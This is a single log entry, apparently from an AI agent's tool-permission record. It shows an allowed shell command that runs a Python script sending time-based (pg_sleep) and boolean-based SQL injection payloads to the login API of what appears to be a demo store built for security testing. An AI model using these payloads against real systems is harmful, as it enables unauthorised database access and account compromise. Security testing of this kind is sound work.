{"ts": 1790691769.7785914, "decision_id": "8887c5f56fb4", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 << 'PYEOF'\nimport requests\nimport time\n\nBASE_URL = \"https://duck-store.escape.tech/api/v1\"\n\n# Time-based SQL injection test\nprint(\"Testing time-based SQLi on login username...\")\nstart = time.time()\nresp = requests.post(f\"{BASE_URL}/auth/login\", \n    json={\"username\": \"test'; SELECT pg_sleep(5) --\", \"password\": \"test\"}, \n    timeout=15)\nelapsed = time.time() - start\nprint(f\"Payload: test'; SELECT pg_sleep(5) -- -> {resp.status_code} - Time: {elapsed:.2f}s\")\n\nstart = time.time()\nresp = requests.post(f\"{BASE_URL}/auth/login\", \n    json={\"username\": \"test'; SELECT pg_sleep(0) --\", \"password\": \"test\"}, \n    timeout=10)\nelapsed = time.time() - start\nprint(f\"Payload: test'; SELECT pg_sleep(0) -- -> {resp.status_code} - Time: {elapsed:.2f}s\")\n\n# Boolean-based - check if we can get different responses\nprint(\"\\nTesting boolean-based SQLi...\")\nresp1 = requests.post(f\"{BASE_URL}/auth/login\", json={\"username\": \"test' AND 1=1 --\", \"password\": \"test\"}, timeout=10)\nresp2 = requests.post(f\"{BASE_URL}/auth/login\", json={\"username\": \"test' AND 1=2 --\", \"password\": \"test\"}, timeout=10)\nprint(f\"1=1 -> {resp1.status_code} - {resp1.text[:100]}\")\nprint(f\"1=2 -> {resp2.status_code} - {resp2.text[:100]}\")\n\n# Try with existing user\nresp1 = requests.post(f\"{BASE_URL}/auth/login\", json={\"username\": \"usera_1790691595' AND 1=1 --\", \"password\": \"TestPass123!\"}, timeout=10)\nresp2 = requests.post(f\"{BASE_URL}/auth/login\", json={\"username\": \"usera_1790691595' AND 1=2 --\", \"password\": \"TestPass123!\"}, timeout=10)\nprint(f\"\\nWith valid user 1=1 -> {resp1.status_code} - {resp1.text[:100]}\")\nprint(f\"With valid user 1=2 -> {resp2.status_code} - {resp2.text[:100]}\")\nPYEOF"}
